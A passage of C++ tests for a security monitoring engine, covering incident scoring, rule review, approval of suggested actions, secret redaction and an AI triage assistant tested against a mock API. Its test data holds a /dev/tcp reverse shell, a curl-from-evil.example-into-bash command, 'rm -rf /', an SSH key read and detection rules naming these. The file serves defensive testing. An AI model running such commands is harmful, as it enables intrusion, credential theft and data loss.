// Tests for the analysis engine (incidents, fleet health, rule review,
// suggestions) and the AI assistant, which runs against an in-process TLS
// mock of the Claude Messages API.
#include <fstream>
#include <sstream>

#include "harness.hpp"
#include "net.hpp"

using namespace std::chrono;

// The mock listens on 127.0.0.1; never send it through a proxy.
static const bool no_proxy_for_tests = [] {
	setenv("NO_PROXY", "127.0.0.1,localhost", 1);
	unsetenv("no_proxy");
	return true;
}();

static std::string ago(minutes m) { return fmt_ts_ms(Clock::now() - m); }

static json alert(const std::string &host, const std::string &rule, const std::string &sev, minutes when,
                  const std::string &actor, const std::string &src, long long pid, long long ppid,
                  const std::string &action = "alert", const std::string &comm = "sh", const std::string &cmd = "") {
	return {{"ts", ago(when)},     {"type", "alert"},   {"host", host},     {"rule", rule},
	        {"severity", sev},     {"title", rule + " title"}, {"mitre", "T1059"}, {"action", action},
	        {"actor", actor},      {"actor_src", src},  {"pid", pid},       {"ppid", ppid},
	        {"comm", comm},        {"cmd", cmd.empty() ? comm + " -c something" : cmd}};
}

// A Store plus the analysis engine, an optional assistant, and HTTP through App.
struct AnEnv : Env {
	Analyst an{st};
	std::unique_ptr<Assistant> ai;
	std::map<std::string, std::shared_ptr<FakeLink>> links;
	std::map<std::string, SensorSession> sessions;

	Response areq(const std::string &method, const std::string &target, const std::string &tok = "",
	              const std::string &body = "") {
		Request r;
		r.method = method;
		auto qm = target.find('?');
		r.path = target.substr(0, qm);
		if (qm != std::string::npos)
			r.query = parse_query(target.substr(qm + 1));
		if (!tok.empty())
			r.headers["authorization"] = "Bearer " + tok;
		r.body = body;
		Response resp;
		App app{st, &an, ai.get()};
		handle(app, r, resp);
		return resp;
	}
	// A connected sensor: hello, then a heartbeat carrying its mode.
	void connect(const std::string &host, const std::string &group, const std::string &mode,
	             const std::string &trust = "tpm", const std::string &version = "1.0.0", double cpu = 0.01) {
		auto link = std::make_shared<FakeLink>();
		links[host] = link;
		sessions[host] = SensorSession{"", link};
		st.sensor_line(sessions[host], json{{"type", "hello"}, {"host", host}, {"group", group}, {"version", version},
		                                    {"host_id", trust + "-" + host}, {"trust", trust}}
		                                   .dump());
		heartbeat(host, mode, cpu);
	}
	void heartbeat(const std::string &host, const std::string &mode, double cpu = 0.01) {
		st.sensor_line(sessions[host], json{{"ts", now_ts()}, {"type", "heartbeat"}, {"host", host}, {"mode", mode},
		                                    {"cpu_pct", cpu}, {"execs", 10}}
		                                   .dump());
	}
	std::vector<Incident> for_host(const std::string &h) {
		std::vector<Incident> out;
		for (auto &i : an.incidents())
			if (i.host == h)
				out.push_back(i);
		return out;
	}
	// The first suggestion of a kind whose action mentions `needle`.
	json suggestion_of(const std::string &kind, const std::string &needle = "") {
		for (auto &s : an.suggestions_json("all"))
			if (s["kind"] == kind && (needle.empty() || s["action"].dump().find(needle) != std::string::npos))
				return s;
		return nullptr;
	}
};

static bool has(const std::vector<std::string> &v, const std::string &needle) {
	for (auto &s : v)
		if (s.find(needle) != std::string::npos)
			return true;
	return false;
}

// ---- incidents -------------------------------------------------------------------

TEST(IncidentsCorrelateByActorAndLineage) {
	AnEnv e;
	e.send(alert("h1", "CRED-001", "high", minutes(60), "ai", "claude", 100, 1));
	e.send(alert("h1", "LOL-003", "low", minutes(58), "human", "tty", 200, 2));          // unrelated actor
	e.send(alert("h1", "PERSIST-02", "medium", minutes(55), "code", "python3", 300, 100));  // child of claude's pid
	e.send(alert("h1", "AI-003", "high", minutes(50), "ai", "claude", 101, 1));
	e.send(alert("h1", "AI-001", "medium", minutes(5), "ai", "claude", 102, 1));  // 45 min later: a new incident
	e.send(alert("h2", "CRED-001", "high", minutes(59), "ai", "claude", 100, 1));  // same pid, other host
	auto h1 = e.for_host("h1");
	CHECK_EQ(h1.size(), (size_t)3);
	bool chain = false;
	for (auto &i : h1)
		if (i.alerts.size() == 3) {
			chain = true;
			CHECK_EQ(i.rules.size(), (size_t)3);
			CHECK(has(i.actors, "ai/claude") && has(i.actors, "code/python3"));
			CHECK_EQ(i.id, "INC-" + i.alerts.front().id);
			CHECK_EQ(i.first_ts, i.alerts.front().ts);
		}
	CHECK(chain);
	CHECK_EQ(e.for_host("h2").size(), (size_t)1);
	// info alerts and console-originated audit records are not incidents
	e.st.audit_secret_access("db/pw", "someone");
	for (auto &i : e.an.incidents())
		CHECK(i.host != "console");
}

TEST(IncidentScoringCampaignAndContainment) {
	AnEnv e;
	for (int i = 1; i <= 3; i++)
		e.send(alert("web-" + std::to_string(i), "RSHELL-01", "critical", minutes(10 + i), "human", "sshd", 500 + i, 1));
	e.send(alert("safe-1", "RSHELL-01", "critical", minutes(300), "human", "sshd", 900, 1, "kill"));
	e.send(alert("quiet-1", "LOL-003", "low", minutes(500), "human", "tty", 901, 1));
	auto w = e.for_host("web-1");
	CHECK_EQ(w.size(), (size_t)1);
	CHECK_EQ(w[0].campaign_hosts.size(), (size_t)2);
	CHECK(has(w[0].reasons, "+10 RSHELL-01 also fired on 2 other hosts"));
	CHECK_EQ(w[0].score, 70);
	CHECK_EQ(w[0].priority, "P2");
	auto s = e.for_host("safe-1");
	CHECK(s[0].contained);
	CHECK(has(s[0].reasons, "-20 contained"));
	CHECK_EQ(s[0].score, 40);
	CHECK_EQ(s[0].priority, "P3");
	CHECK(s[0].campaign_hosts.empty());  // five hours apart: not the same campaign
	auto q = e.for_host("quiet-1");
	CHECK_EQ(q[0].priority, "P4");
	// ranking: open incidents by score
	auto all = e.an.incidents();
	for (size_t i = 1; i < all.size(); i++)
		CHECK(all[i - 1].score >= all[i].score);
}

TEST(IncidentAPIAndTriage) {
	AnEnv e;
	e.send(alert("h1", "CRED-001", "high", minutes(10), "ai", "claude", 100, 1));
	e.send(alert("h1", "AI-003", "high", minutes(9), "ai", "claude", 100, 1));
	auto list = e.areq("GET", "/api/incidents", TOK_VIEWER);
	CHECK_EQ(list.status, 200);
	auto inc = body_json(list);
	CHECK_EQ(inc.size(), (size_t)1);
	std::string id = inc[0]["id"];
	CHECK_EQ(inc[0]["alert_count"].get<int>(), 2);
	auto det = e.areq("GET", "/api/incidents/detail?id=" + id, TOK_VIEWER);
	CHECK_EQ(det.status, 200);
	CHECK_EQ(body_json(det)["alerts"].size(), (size_t)2);
	CHECK_EQ(e.areq("GET", "/api/incidents/detail?id=INC-nope", TOK_VIEWER).status, 404);
	std::string tri = json{{"id", id}, {"status", "resolved"}, {"note", "benign: test"}}.dump();
	CHECK_EQ(e.areq("POST", "/api/incidents/triage", TOK_VIEWER, tri).status, 403);
	CHECK_EQ(e.areq("GET", "/api/incidents/triage", TOK_OPERATOR).status, 405);
	CHECK_EQ(e.areq("POST", "/api/incidents/triage", TOK_OPERATOR, R"({"id":"x","status":"bogus"})").status, 400);
	auto t = e.areq("POST", "/api/incidents/triage", TOK_OPERATOR, tri);
	CHECK_EQ(t.status, 200);
	CHECK_EQ(body_json(t)["updated"].get<int>(), 2);
	CHECK_EQ(body_json(e.areq("GET", "/api/incidents", TOK_VIEWER)).size(), (size_t)0);  // resolved are hidden
	auto all = body_json(e.areq("GET", "/api/incidents?status=all", TOK_VIEWER));
	CHECK_EQ(all.size(), (size_t)1);
	CHECK_EQ(all[0]["status"], "resolved");
	// the bare-Store HTTP surface has no analysis
	CHECK_EQ(e.req("GET", "/api/incidents", TOK_VIEWER).status, 404);
}

// ---- fleet health and rule review -------------------------------------------------------

TEST(FleetHealthFindings) {
	AnEnv e;
	e.connect("fast", "g", "enforce", "tpm", "1.0.0", 0.2);
	e.connect("weak", "g", "enforce", "generated");
	e.connect("old", "g", "enforce", "tpm", "0.9.0");
	e.connect("lap", "g", "monitor");
	e.send(alert("lap", "RSHELL-01", "critical", minutes(3), "ai", "claude", 10, 1, "would-block"));
	auto h = e.an.health_json();
	std::map<std::string, json> f;
	for (auto &x : h["findings"])
		f[x["id"]] = x;
	CHECK(f.count("sensor-cpu") && f["sensor-cpu"]["hosts"] == json::array({"fast"}));
	CHECK(f.count("identity") && f["identity"]["hosts"] == json::array({"weak"}));
	CHECK(f.count("version-drift") && f["version-drift"]["hosts"] == json::array({"old"}));
	CHECK(f.count("unprotected") && f["unprotected"]["hosts"] == json::array({"lap"}));
	CHECK_EQ(h["status"], "critical");
	CHECK_EQ(h["sensors_connected"].get<int>(), 4);
	CHECK_EQ(e.areq("GET", "/api/analysis/health", TOK_VIEWER).status, 200);
}

TEST(RuleReviewFindsNoiseAndRulesReadyToEnforce) {
	AnEnv e;
	for (int i = 0; i < 12; i++)
		e.send(alert("dev-" + std::to_string(i % 3), "NOISY-1", "medium", minutes(100 - i), "human", "tty", 1000 + i, 1,
		             "alert", i < 10 ? "git" : "cat"));
	for (int i = 0; i < 3; i++)
		e.send(alert("web-1", "REAL-1", "high", minutes(90 - i), "ai", "codex", 2000 + i, 1));
	int benign = 0, ack = 0;
	for (auto &a : e.st.alerts_copy()) {
		if (a.rule == "NOISY-1" && a.comm == "git" && benign < 6) {
			e.st.triage(a.id, "resolved", benign % 2 ? "False positive - git fetch" : "benign, expected", "olive");
			benign++;
		}
		if (a.rule == "NOISY-1" && a.comm == "cat")  // "unexpected" / "illegitimate" are not benign verdicts
			e.st.triage(a.id, "resolved", "unexpected, illegitimate read of the key", "olive");
		if (a.rule == "REAL-1" && ack < 2) {
			e.st.triage(a.id, "acknowledged", "confirmed exfil attempt", "olive");
			ack++;
		}
	}
	std::map<std::string, RuleStat> by;
	for (auto &r : e.an.rule_stats())
		by[r.rule] = r;
	CHECK_EQ(by["NOISY-1"].assessment, "noisy");
	CHECK_EQ(by["NOISY-1"].benign, 6);
	CHECK(contains(by["NOISY-1"].advice, "!comm=git"));
	CHECK_EQ(by["NOISY-1"].programs.front().first, "git");
	CHECK_EQ(by["REAL-1"].assessment, "ready_to_enforce");
	CHECK_EQ(e.an.run() >= 2, true);
	CHECK(e.suggestion_of("tune_rule", "NOISY-1") != nullptr);
	CHECK(e.suggestion_of("enforce_rule", "REAL-1") != nullptr);
	auto tune = e.suggestion_of("tune_rule", "NOISY-1");
	CHECK_EQ(tune["action"]["type"], "manual");
	CHECK_EQ(body_json(e.areq("GET", "/api/analysis/rules", TOK_VIEWER)).size(), (size_t)2);
}

// ---- suggestions ------------------------------------------------------------------------

TEST(SuggestionLifecycleApproveRejectExpireReplay) {
	AnEnv e;
	e.connect("lap-1", "dev", "monitor");
	e.connect("lap-2", "dev", "monitor");
	e.connect("lap-3", "dev", "monitor");
	for (auto h : {"lap-1", "lap-2", "lap-3"})
		e.send(alert(h, "RSHELL-01", "critical", minutes(2), "ai", "claude", 77, 1, "would-block"));
	CHECK(e.an.run() >= 3);
	auto s1 = e.suggestion_of("contain", "lap-1");
	CHECK(s1 != nullptr);
	CHECK_EQ(s1["action"], json({{"type", "push"}, {"host", "lap-1"}, {"control", "enforce"}}));
	CHECK_EQ(s1["required_role"], "operator");
	CHECK_EQ(s1["status"], "proposed");
	std::string id = s1["id"];
	auto approve = json{{"id", id}, {"decision", "approve"}, {"note", "go"}}.dump();
	CHECK_EQ(e.areq("POST", "/api/suggestions/decide", TOK_VIEWER, approve).status, 403);
	auto dep = e.areq("POST", "/api/suggestions/decide", TOK_DEPLOYER, approve);
	CHECK_EQ(dep.status, 403);
	CHECK(contains(dep.body, "operator"));
	CHECK_EQ(e.areq("POST", "/api/suggestions/decide", TOK_OPERATOR, R"({"id":"x","decision":"maybe"})").status, 400);
	CHECK_EQ(e.areq("POST", "/api/suggestions/decide", TOK_OPERATOR, R"({"id":"nope","decision":"approve"})").status,
	         400);
	auto ok = e.areq("POST", "/api/suggestions/decide", TOK_OPERATOR, approve);
	CHECK_EQ(ok.status, 200);
	CHECK_EQ(body_json(ok)["status"], "applied");
	CHECK_EQ(body_json(ok)["decided_by"], "Olive Ortega");
	{
		std::lock_guard g(e.links["lap-1"]->mu);
		CHECK(!e.links["lap-1"]->sent.empty() && e.links["lap-1"]->sent.back() == R"({"mode":"enforce"})");
	}
	CHECK_EQ(e.areq("POST", "/api/suggestions/decide", TOK_OPERATOR, approve).status, 400);  // already applied

	std::string id2 = e.suggestion_of("contain", "lap-2")["id"];
	auto rej = e.an.decide(id2, false, "olive", "operator", "laptop is being reimaged");
	CHECK_EQ(rej.status, "rejected");
	CHECK_EQ(rej.result, "laptop is being reimaged");

	// lap-3 now enforces on its own: its suggestion no longer applies
	e.heartbeat("lap-3", "enforce");
	e.an.run();
	CHECK_EQ(e.suggestion_of("contain", "lap-3")["status"], "expired");
	// applied and rejected suggestions are not proposed again
	int contain = 0;
	for (auto &s : e.an.suggestions_json("all"))
		contain += s["kind"] == "contain";
	CHECK_EQ(contain, 3);
	CHECK_EQ(e.an.suggestions_json("").size(), e.an.suggestions_json("proposed").size());

	// A sensor cannot inject suggestion records.
	e.st.sensor_line(e.sessions["lap-1"],
	                 json{{"type", "suggestion"}, {"host", "lap-1"}, {"id", "S-forged"}, {"kind", "contain"},
	                      {"action", {{"type", "push"}, {"host", "lap-1"}, {"control", "monitor"}}}}
	                     .dump());
	// Everything survives a restart (journal replay).
	Store st2;
	Analyst an2(st2);
	st2.replay_hook = [&](const json &r) { an2.replay(r); };
	st2.open_journal(e.st.journal_path());
	auto r1 = an2.suggestion(id);
	CHECK(r1 && r1->status == "applied" && r1->decided_by == "Olive Ortega");
	auto r2 = an2.suggestion(id2);
	CHECK(r2 && r2->status == "rejected");
	CHECK(!an2.suggestion("S-forged"));
	st2.close_journal();
	std::ifstream jf(e.st.journal_path());
	std::stringstream ss;
	ss << jf.rdbuf();
	CHECK(ss.str().find("S-forged") == std::string::npos);
}

TEST(SuggestionValidation) {
	AnEnv e;
	e.connect("h1", "g1", "monitor");
	e.send(alert("h1", "X-1", "high", minutes(1), "ai", "claude", 5, 1));
	std::string aid = e.st.alerts_copy().back().id;
	auto bad = [&](json a) {
		try {
			e.an.validate_action(a);
			return false;
		} catch (const std::invalid_argument &) {
			return true;
		}
	};
	CHECK(bad(json::array()));
	CHECK(bad({{"type", "shell"}, {"cmd", "rm -rf /"}}));
	CHECK(bad({{"type", "push"}, {"host", "h1"}, {"control", "uninstall"}}));
	CHECK(bad({{"type", "push"}, {"host", "nope"}, {"control", "enforce"}}));
	CHECK(bad({{"type", "rollout"}, {"group", "g1"}, {"control", "enforce"}, {"percent", 0}}));
	CHECK(bad({{"type", "rollout"}, {"group", "g1"}, {"control", "enforce"}, {"percent", "10"}}));
	CHECK(bad({{"type", "rollout"}, {"group", "nogroup"}, {"control", "enforce"}, {"percent", 10}}));
	CHECK(bad({{"type", "triage"}, {"alerts", {"A-nope"}}, {"status", "resolved"}}));
	CHECK(bad({{"type", "triage"}, {"alerts", {aid}}, {"status", "deleted"}}));
	CHECK(bad({{"type", "manual"}, {"instructions", ""}}));
	CHECK(!bad({{"type", "push"}, {"host", "h1"}, {"control", "enforce"}}));
	CHECK(!bad({{"type", "rollout"}, {"group", "g1"}, {"control", "enforce"}, {"percent", 10}}));
	CHECK(!bad({{"type", "triage"}, {"alerts", {aid}}, {"status", "resolved"}, {"note", "x"}}));
	CHECK(!bad({{"type", "manual"}, {"instructions", "rotate the key"}}));
	CHECK_EQ(required_role({{"type", "rollout"}}), "deployer");
	CHECK_EQ(required_role({{"type", "push"}}), "operator");
	Suggestion s;
	s.kind = "x";
	s.title = "t";
	s.action = {{"type", "push"}, {"host", "ghost"}, {"control", "enforce"}};
	bool threw = false;
	try {
		e.an.propose(s);
	} catch (const std::invalid_argument &) {
		threw = true;
	}
	CHECK(threw);
}

// Journal lines for a group that has been monitored for three days.
static std::string seeded_journal(const std::vector<std::string> &extra) {
	std::string j;
	for (auto h : {"g1-a", "g1-b", "g1-c"}) {
		j += json{{"ts", ago(minutes(3 * 24 * 60))}, {"type", "hello"}, {"host", h}, {"group", "g1"},
		          {"host_id", std::string("tpm-") + h}, {"trust", "tpm"}, {"version", "1.0.0"}}
		         .dump() +
		     "\n";
		j += json{{"ts", ago(minutes(3 * 24 * 60))}, {"type", "heartbeat"}, {"host", h}, {"mode", "monitor"}}.dump() +
		     "\n";
	}
	for (auto &x : extra)
		j += x + "\n";
	return j;
}

static std::vector<json> rollout_suggestions(const std::string &journal) {
	TempDir d;
	std::string err;
	write_file_atomic(d.path + "/events.jsonl", journal, 0600, &err);
	Store st;
	Analyst an(st);
	st.replay_hook = [&](const json &r) { an.replay(r); };
	st.open_journal(d.path + "/events.jsonl");
	an.run();
	std::vector<json> out;
	for (auto &s : an.suggestions_json("all"))
		if (s["kind"] == "rollout")
			out.push_back(s);
	st.close_journal();
	return out;
}

TEST(GradualEnforcementSuggestions) {
	// Watched for three days, nothing noisy: start with a 10% canary.
	auto s = rollout_suggestions(seeded_journal({}));
	CHECK_EQ(s.size(), (size_t)1);
	if (!s.empty()) {
		CHECK_EQ(s[0]["action"], json({{"type", "rollout"}, {"group", "g1"}, {"control", "enforce"}, {"percent", 10}}));
		CHECK_EQ(s[0]["required_role"], "deployer");
	}
	// The 10% stage ran two days ago: expand to 50%.
	json r10 = {{"ts", ago(minutes(2 * 24 * 60))}, {"type", "rollout"}, {"action", "enforce"}, {"group", "g1"},
	            {"percent", 10}, {"by", "dee"}};
	s = rollout_suggestions(seeded_journal({r10.dump()}));
	CHECK(s.size() == 1 && s[0]["action"]["percent"] == 50);
	// ...but not if it only just started.
	r10["ts"] = ago(minutes(60));
	CHECK_EQ(rollout_suggestions(seeded_journal({r10.dump()})).size(), (size_t)0);
	// A deliberate rollback to monitor holds suggestions off for a week.
	json back = {{"ts", ago(minutes(60))}, {"type", "rollout"}, {"action", "monitor"}, {"group", "g1"}, {"percent", 100}};
	CHECK_EQ(rollout_suggestions(seeded_journal({back.dump()})).size(), (size_t)0);
	// Noise gate: a blocking rule closed as benign means enforcing would hurt.
	json a = alert("g1-a", "PKG-001", "high", minutes(120), "human", "tty", 5, 1, "would-block");
	a["id"] = "A1-1";
	json t = {{"ts", ago(minutes(100))}, {"type", "triage"}, {"id", "A1-1"}, {"status", "resolved"},
	          {"note", "false positive: our installer"}, {"by", "olive"}};
	CHECK_EQ(rollout_suggestions(seeded_journal({a.dump(), t.dump()})).size(), (size_t)0);
}

TEST(ApprovedRolloutRunsThroughTheRolloutPath) {
	TempDir d;
	std::string err;
	write_file_atomic(d.path + "/events.jsonl", seeded_journal({}), 0600, &err);
	Store st;
	Analyst an(st);
	st.replay_hook = [&](const json &r) { an.replay(r); };
	st.open_journal(d.path + "/events.jsonl");
	std::vector<std::shared_ptr<FakeLink>> links;
	std::vector<SensorSession> sess;
	for (int k = 0; k < 3; k++) {
		links.push_back(std::make_shared<FakeLink>());
		sess.push_back({"", links.back()});
	}
	int i = 0;
	for (auto h : {"g1-a", "g1-b", "g1-c"})
		st.sensor_line(sess[i++], json{{"type", "hello"}, {"host", h}, {"group", "g1"}, {"host_id", std::string("tpm-") + h},
		                               {"trust", "tpm"}}
		                              .dump());
	an.run();
	std::string id;
	for (auto &s : an.suggestions_json(""))
		if (s["kind"] == "rollout")
			id = s["id"];
	CHECK(!id.empty());
	bool denied = false;
	try {
		an.decide(id, true, "vic", "viewer", "");
	} catch (const std::domain_error &) {
		denied = true;
	}
	CHECK(denied);
	auto s = an.decide(id, true, "dee", "deployer", "");
	CHECK_EQ(s.status, "applied");
	CHECK(contains(s.result, "enforce to 10% of g1"));
	CHECK_EQ(st.rollout_count(), (size_t)1);
	auto ro = st.rollouts_json();
	CHECK_EQ(ro[0]["by"], "dee via " + id);
	st.close_journal();
}

// ---- redaction and rule syntax ----------------------------------------------------------

TEST(RedactionRemovesSecrets) {
	struct Case {
		std::string in, gone, kept;
	};
	std::vector<Case> cases = {
	    {"mysql --password=hunter2 -h db", "hunter2", "mysql"},
	    {"mysql --password hunter2 -h db", "hunter2", "-h db"},
	    {"curl -H 'Authorization: Bearer abc.def.ghi' https://x", "abc.def.ghi", "https://x"},
	    {"git clone https://dev:pa55w0rd@github.com/x.git", "pa55w0rd", "dev:[REDACTED]@github.com"},
	    {"export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "wJalrXUtnFEMI", "export"},
	    {"aws --key AKIAIOSFODNN7EXAMPLE s3 ls", "AKIAIOSFODNN7EXAMPLE", "s3 ls"},
	    {"echo ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789 | gh auth", "ghp_aBcD", "gh auth"},
	    {"ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijklmnop python run.py", "sk-ant-api03", "python run.py"},
	    {"token: s3cr3t-value next", "s3cr3t-value", "next"},
	    {"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----", "b3BlbnNzaC1rZXk",
	     "[REDACTED PRIVATE KEY]"},
	    {"curl https://x/?q=1&api_key=Zx81kQ&b=2", "Zx81kQ", "&b=2"},
	    {"jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U", "eyJhbGci",
	     "jwt"},
	    {"upload blob Q2hhbmdlTWVQbGVhc2VUaGlzSXNBU2VjcmV0VmFsdWUx done", "Q2hhbmdlTWVQ", "done"},
	};
	for (auto &c : cases) {
		std::string r = redact(c.in);
		if (contains(r, c.gone) || !contains(r, c.kept))
			std::cerr << "    redact(\"" << c.in << "\") = \"" << r << "\"\n";
		CHECK(!contains(r, c.gone));
		CHECK(contains(r, c.kept));
	}
	// Things an analyst needs stay intact.
	for (std::string keep : {"sha256sum e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
	                         "/usr/lib/python3/site-packages/requests/__init__.py", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
	                         "cat /home/dev/.ssh/id_ed25519", "npm install --unsafe-perm left-pad-ng"})
		CHECK_EQ(redact(keep), keep);
	json j = redact_json({{"cmd", "x --token=abc123"}, {"list", {"password=1", 5}}, {"n", 3}});
	CHECK_EQ(j["cmd"], "x --token=[REDACTED]");
	CHECK_EQ(j["list"][0], "password=[REDACTED]");
	CHECK_EQ(j["n"], 3);
}

TEST(RuleLineSyntaxCheck) {
	CHECK_EQ(check_rule_line(R"(CRED-001 high alert T1552.001 "Read of SSH private key" cmd*=/.ssh/id_ !comm=ssh,git)"),
	         "");
	CHECK_EQ(check_rule_line(R"(X-1 low ignore - "allow apt" comm=apt,dpkg tty=yes)"), "");
	CHECK_EQ(check_rule_line(R"(X-1 high kill T1059 "shell" mode=enforce "cmd*=| sh,| bash" comm=curl)"), "");
	CHECK(!check_rule_line(R"(X-1 urgent alert - "t" comm=sh)").empty());
	CHECK(!check_rule_line(R"(X-1 high delete - "t" comm=sh)").empty());
	CHECK(!check_rule_line(R"(X-1 high alert TX "t" comm=sh)").empty());
	CHECK(!check_rule_line(R"(X-1 high alert - "t" path=/etc)").empty());
	CHECK(!check_rule_line(R"(X-1 high alert - "t" mode=enforce)").empty());  // no condition
	CHECK(!check_rule_line(R"(X-1 high alert - "unterminated comm=sh)").empty());
	CHECK(!check_rule_line("X-1 high alert - \"t\" comm=sh\nY-2 high kill - \"u\" comm=sh").empty());
}

// ---- AI assistant against a mock Claude API ----------------------------------------------

// A TLS server that answers POST /v1/messages from a scripted handler and
// records every request.
struct MockApi {
	struct Reply {
		int status;
		json body;
		std::string retry_after;
		bool chunked = false;
		std::string raw;  // when set, sent as the whole response instead
		Reply(int s = 200, json b = json::object(), std::string ra = "")
		    : status(s), body(std::move(b)), retry_after(std::move(ra)) {}
	};
	TempDir dir;
	SSLCtxPtr ctx;
	Listener ln{"127.0.0.1:0"};
	std::mutex mu;
	std::vector<json> bodies;
	std::vector<std::map<std::string, std::string>> headers;
	std::function<Reply(const json &, int)> handler;
	std::thread th;

	MockApi() {
		std::string cmd = "openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -days 1 -subj /CN=127.0.0.1 "
		                  "-addext subjectAltName=IP:127.0.0.1 -keyout " +
		                  dir.path + "/k.pem -out " + dir.path + "/c.pem >/dev/null 2>&1";
		if (system(cmd.c_str()) != 0)
			throw std::runtime_error("openssl CLI is needed for the AI tests");
		ctx = make_server_ctx(cert(), dir.path + "/k.pem", "");
		th = std::thread([this] { loop(); });
	}
	~MockApi() {
		ln.close();
		th.join();
	}
	std::string cert() const { return dir.path + "/c.pem"; }
	std::string url() const { return "https://127.0.0.1:" + std::to_string(ln.port()); }
	size_t count() {
		std::lock_guard g(mu);
		return bodies.size();
	}
	void loop() {
		for (;;) {
			int fd = ln.accept_fd();
			if (fd < 0)
				return;
			Stream s(fd, ctx.get());
			if (!s.handshake(after(seconds(5))))
				continue;
			std::string in;
			char buf[65536];
			size_t he = std::string::npos, need = 0;
			while (true) {
				long n = s.read_some(buf, sizeof buf, after(seconds(5)));
				if (n <= 0)
					break;
				in.append(buf, (size_t)n);
				if (he == std::string::npos && (he = in.find("\r\n\r\n")) != std::string::npos) {
					auto cl = to_lower(in.substr(0, he)).find("content-length:");
					need = cl == std::string::npos ? 0 : std::stoul(in.substr(cl + 15));
				}
				if (he != std::string::npos && in.size() >= he + 4 + need)
					break;
			}
			if (he == std::string::npos)
				continue;
			std::map<std::string, std::string> h;
			std::istringstream hs(in.substr(0, he));
			std::string line;
			std::getline(hs, line);
			while (std::getline(hs, line)) {
				auto c = line.find(':');
				if (c != std::string::npos)
					h[to_lower(trim(line.substr(0, c)))] = trim(line.substr(c + 1));
			}
			json body = json::parse(in.substr(he + 4, need), nullptr, false);
			int n;
			{
				std::lock_guard g(mu);
				bodies.push_back(body);
				headers.push_back(h);
				n = (int)bodies.size();
			}
			Reply r = handler ? handler(body, n) : Reply{200, json::object()};
			if (!r.raw.empty()) {
				s.write_all(r.raw, after(seconds(5)));
				s.close_gracefully(after(seconds(1)));
				continue;
			}
			std::string payload = r.body.dump();
			std::string resp = "HTTP/1.1 " + std::to_string(r.status) + " X\r\nContent-Type: application/json\r\n" +
			                   (r.retry_after.empty() ? "" : "retry-after: " + r.retry_after + "\r\n");
			if (r.chunked) {  // two chunks, so the client has to reassemble
				size_t half = payload.size() / 2;
				auto chunk = [](const std::string &c) {
					char len[16];
					snprintf(len, sizeof len, "%zx", c.size());
					return std::string(len) + "\r\n" + c + "\r\n";
				};
				resp += "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n" + chunk(payload.substr(0, half)) +
				        chunk(payload.substr(half)) + "0\r\n\r\n";
			} else {
				resp += "Content-Length: " + std::to_string(payload.size()) + "\r\nConnection: close\r\n\r\n" + payload;
			}
			s.write_all(resp, after(seconds(5)));
			s.close_gracefully(after(seconds(1)));
		}
	}
};

static json api_message(json content, const std::string &stop = "end_turn") {
	return {{"id", "msg_test"},   {"type", "message"},      {"role", "assistant"},
	        {"model", "claude-opus-5-5"}, {"content", content}, {"stop_reason", stop},
	        {"usage", {{"input_tokens", 100}, {"output_tokens", 20}}}};
}

static AiConfig test_ai(const MockApi &m) {
	AiConfig c;
	c.api_key = "test-key-0123";
	c.base_url = m.url();
	c.ca_file = m.cert();
	return c;
}

static json wait_job(Assistant &ai, const std::string &id) {
	for (int i = 0; i < 300; i++) {
		auto j = ai.job(id);
		if (j && ((*j)["status"] == "done" || (*j)["status"] == "failed"))
			return *j;
		std::this_thread::sleep_for(milliseconds(20));
	}
	return {{"status", "timeout"}};
}

TEST(AiTriageProposesOnlyValidatedInScopeActions) {
	MockApi m;
	AnEnv e;
	e.connect("lap-1", "dev", "monitor");
	e.connect("lap-9", "other", "monitor");
	e.send(alert("lap-1", "RSHELL-01", "critical", minutes(2), "ai", "claude", 77, 1, "would-block", "bash",
	             "curl -H 'Authorization: Bearer sekr3tT0kenValue' https://evil.example/x | bash"));
	auto inc = e.for_host("lap-1").at(0);
	auto act = [](json o) {
		json base = {{"type", ""},  {"title", "t"},         {"rationale", "r"},     {"host", ""}, {"group", ""},
		             {"control", ""}, {"percent", 0}, {"triage_status", ""}, {"instructions", ""}};
		for (auto &[k, v] : o.items())
			base[k] = v;
		return base;
	};
	json result = {{"verdict", "malicious"},
	               {"confidence", "high"},
	               {"summary", "Reverse shell by an AI agent."},
	               {"reasoning", {"RSHELL-01 matched"}},
	               {"recommended_actions",
	                {act({{"type", "push"}, {"title", "Enforce lap-1"}, {"host", "lap-1"}, {"control", "enforce"}}),
	                 act({{"type", "push"}, {"title", "Enforce lap-9"}, {"host", "lap-9"}, {"control", "enforce"}}),
	                 act({{"type", "push"}, {"title", "Relax lap-1"}, {"host", "lap-1"}, {"control", "monitor"}}),
	                 act({{"type", "rollout"}, {"title", "Roll other"}, {"group", "other"}, {"control", "enforce"}, {"percent", 10}}),
	                 act({{"type", "triage"}, {"title", "Ack"}, {"triage_status", "acknowledged"}}),
	                 act({{"type", "manual"}, {"title", "Rotate"}, {"instructions", "Rotate the agent's API tokens."}})}}};
	m.handler = [&](const json &, int) {
		return MockApi::Reply{200, api_message({{{"type", "thinking"}, {"thinking", ""}, {"signature", "s"}},
		                                        {{"type", "text"}, {"text", result.dump()}}})};
	};
	e.ai = std::make_unique<Assistant>(e.st, e.an, test_ai(m));
	auto sub = e.areq("POST", "/api/ai/triage", TOK_OPERATOR, json{{"incident", inc.id}}.dump());
	CHECK_EQ(sub.status, 202);
	auto job = wait_job(*e.ai, body_json(sub)["id"]);
	CHECK_EQ(job["status"], "done");
	CHECK_EQ(job["result"]["verdict"], "malicious");
	CHECK_EQ(job["result"]["suggestions"].size(), (size_t)3);  // push lap-1, triage, manual
	CHECK_EQ(job["result"]["dropped"].size(), (size_t)3);      // other host, monitor, other group
	CHECK_EQ(job["usage"]["output_tokens"].get<int>(), 20);
	// the request
	CHECK_EQ(m.count(), (size_t)1);
	auto &b = m.bodies[0];
